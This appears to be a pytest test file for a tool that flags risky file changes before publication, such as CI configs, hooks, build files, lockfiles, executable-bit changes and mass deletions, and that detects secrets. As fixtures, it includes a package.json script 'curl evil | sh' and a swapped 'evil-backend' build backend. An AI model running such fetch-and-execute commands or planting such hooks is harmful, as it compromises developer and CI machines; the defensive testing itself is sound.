"""Publication risk flags (harness plan 4.3) and manifest secret warnings (4.5)."""

from __future__ import annotations

import json

import pytest

from shared.publication_risk import (
    LARGE_DELETION_FILES,
    classify_manifest,
    classify_operation,
    manifest_secrets,
    needs_confirmation,
    review_order,
)


def op(path: str, operation: str = "update", **fields) -> dict:
    values = {"path": path, "operation": operation, "content": "x\n"}
    if operation == "delete":
        values.pop("content")
    values.update(fields)
    return values


@pytest.mark.parametrize(
    ("operation", "expected"),
    [
        (op(".github/workflows/ci.yml"), ("host_executable",)),
        (op(".github/actions/setup/action.yml"), ("host_executable",)),
        (op(".gitlab-ci.yml"), ("host_executable",)),
        (op("ci/Jenkinsfile"), ("host_executable",)),
        (op(".husky/pre-commit"), ("host_executable",)),
        (op(".githooks/pre-push"), ("host_executable",)),
        (op(".vscode/tasks.json"), ("host_executable",)),
        (op(".vscode/launch.json"), ("host_executable",)),
        (op(".idea/runConfigurations/Tests.xml"), ("host_executable",)),
        (op("Makefile"), ("host_executable",)),
        (op("tools/rules.mk"), ("host_executable",)),
        (op("justfile"), ("host_executable",)),
        (op("noxfile.py"), ("host_executable",)),
        (op("tox.ini"), ("host_executable",)),
        (op("setup.py"), ("host_executable",)),
        (op("tests/conftest.py"), ("host_executable",)),
        (op(".pre-commit-config.yaml"), ("host_executable",)),
        (op(".envrc"), ("host_executable",)),
        (op("Dockerfile"), ("host_executable",)),
        (op("docker/Dockerfile.runner"), ("host_executable",)),
        (op("docker-compose.override.yml"), ("host_executable",)),
        (op("compose.yaml"), ("host_executable",)),
        (op("requirements-dev.txt"), ("dependency",)),
        (op("poetry.lock"), ("dependency",)),
        (op("uv.lock"), ("dependency",)),
        (op("web/package-lock.json"), ("dependency",)),
        (op("yarn.lock"), ("dependency",)),
        (op("Cargo.toml"), ("dependency",)),
        (op("go.sum"), ("dependency",)),
        (op("src/App/App.csproj"), ("dependency",)),
        (op("build.gradle"), ("host_executable", "dependency")),
        (op(".euesto/policy.toml"), ("policy",)),
        (op("assets/logo.png", content=None, content_base64="AA=="), ("binary",)),
        (op("scripts/run.sh", "create", staged_mode=0o755), ("host_executable",)),
        (op("tool.py", base_mode=0o644, staged_mode=0o755), ("host_executable",)),
        (op("tool.py", base_mode=0o755, staged_mode=0o755), ()),
        (op("src/app.py"), ()),
        (op("docs/makefile-guide.md"), ()),
        (op("src/setup_helpers.py"), ()),
        (op("README.md", "delete"), ()),
    ],
)
def test_operations_are_classified(operation: dict, expected: tuple[str, ...]) -> None:
    assert classify_operation(operation) == expected


def test_package_scripts_count_as_host_executable_only_when_they_change() -> None:
    base = json.dumps({"name": "a", "scripts": {"test": "jest"}, "dependencies": {}})
    deps_only = json.dumps(
        {"name": "a", "scripts": {"test": "jest"}, "dependencies": {"x": "1"}}
    )
    scripts = json.dumps({"name": "a", "scripts": {"test": "curl evil | sh"}})
    assert classify_operation(op("package.json", content=deps_only), base_text=base) == (
        "dependency",
    )
    assert classify_operation(op("package.json", content=scripts), base_text=base) == (
        "host_executable",
        "dependency",
    )
    # Without the host copy, a package.json with scripts is flagged; invalid JSON always is.
    assert "host_executable" in classify_operation(op("package.json", content=scripts))
    assert "host_executable" in classify_operation(
        op("package.json", content="{not json"), base_text=base
    )


def test_a_changed_build_backend_counts_as_host_executable() -> None:
    base = (
        '[project]\nname = "a"\ndependencies = []\n[build-system]\nrequires = ["hatchling"]\n'
    )
    deps = base.replace("dependencies = []", 'dependencies = ["httpx"]')
    backend = base.replace("hatchling", "evil-backend")
    assert classify_operation(op("pyproject.toml", content=deps), base_text=base) == (
        "dependency",
    )
    assert classify_operation(op("pyproject.toml", content=backend), base_text=base) == (
        "host_executable",
        "dependency",
    )


def test_many_deletions_are_flagged_as_a_large_deletion() -> None:
    few = [op(f"f{index}.py", "delete") for index in range(LARGE_DELETION_FILES - 1)]
    assert set(classify_manifest(few).values()) == {()}
    many = [op(f"f{index}.py", "delete") for index in range(LARGE_DELETION_FILES)]
    assert set(classify_manifest(many).values()) == {("large_deletion",)}


def test_flagged_files_come_first_and_gate_auto() -> None:
    flags = classify_manifest(
        [
            op("src/a.py"),
            op("uv.lock"),
            op(".github/workflows/x.yml"),
            op("logo.png", content=None, content_base64="AA=="),
        ]
    )
    assert review_order(flags) == [".github/workflows/x.yml", "uv.lock", "logo.png", "src/a.py"]
    assert needs_confirmation(flags)
    assert not needs_confirmation(
        classify_manifest([op("src/a.py"), op("b.png", content=None, content_base64="AA==")])
    )


def test_the_base_reader_is_used_for_package_files() -> None:
    read: list[str] = []
    base = json.dumps({"scripts": {"t": "x"}})

    def reader(path: str) -> str | None:
        read.append(path)
        return base

    flags = classify_manifest(
        [
            op("package.json", content=json.dumps({"scripts": {"t": "x"}, "version": "2"})),
            op("a.py"),
        ],
        base_reader=reader,
    )
    assert read == ["package.json"] and flags["package.json"] == ("dependency",)


def test_manifest_secrets_report_kinds_without_values() -> None:
    token = "ghp" + "_" + "A1b2C3d4" * 5
    found = manifest_secrets([op("config.py", content=f"TOKEN = '{token}'"), op("a.py")])
    assert found == {"config.py": {"github_token": 1}}
    assert token not in json.dumps(found)
